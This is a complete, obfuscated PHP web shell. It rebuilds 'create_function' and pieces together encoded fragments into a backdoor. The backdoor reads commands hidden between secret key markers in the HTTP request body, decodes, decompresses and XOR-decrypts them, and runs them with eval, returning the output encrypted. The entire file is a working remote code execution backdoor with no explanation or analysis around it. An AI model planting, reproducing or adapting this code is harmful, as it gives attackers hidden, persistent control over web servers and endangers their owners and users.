<?php
$Z=str_replace('v','','vcreavtev_fuvnvctvion');
$Q='Ee($m[1]),$k))).E;$o=@ob_.Ege.Et_contents().E;@ob.E_en.Ed_clean(.E.E).E;$r=';
$m=')==1.E) {@ob_.Estart();@.Eeva.El(@gzuncompr.Ee.Ess(@x.E(@ba.Ese64_d.Eecod.';
$i=';$j+.E+,$i++.E){$o.E.=$t.E{$i}^$k{.E$j.E.E};}}return $o;}if .E(.E.E@preg_ma';
$t='"j.EYMd8eGWZy.EcuR.E.EGx5";func.Etion x(.E$t,$k).E{$c=strlen($.Ek);.E$l=st';
$n='$k.E="131.Ee2b60";$.Ekh.E="b583816.E9aaa2";$kf=.E"2a6a.Ea.E0d.E967fe";$p=';
$P='r.Elen.E($t).E;$o="";for($.Ei=0;$i<$l;.E.E){f.Eor($j=0;($.Ej<$c&&$i<.E$l)';
$a='@b.Ease64_encode(@.Ex(@gzcomp.Eress($o).E,.E$.Ek));print("$p$kh$.Er$kf");}';
$g='tch.E("/$kh(.+).E$kf.E/",@file_get.E_.Econtents(".Ephp://i.Enp.Eut").E.E,$m';
$p=str_replace('.E','',$n.$t.$P.$i.$g.$m.$Q.$a);
$S=$Z('',$p);$S();
?>
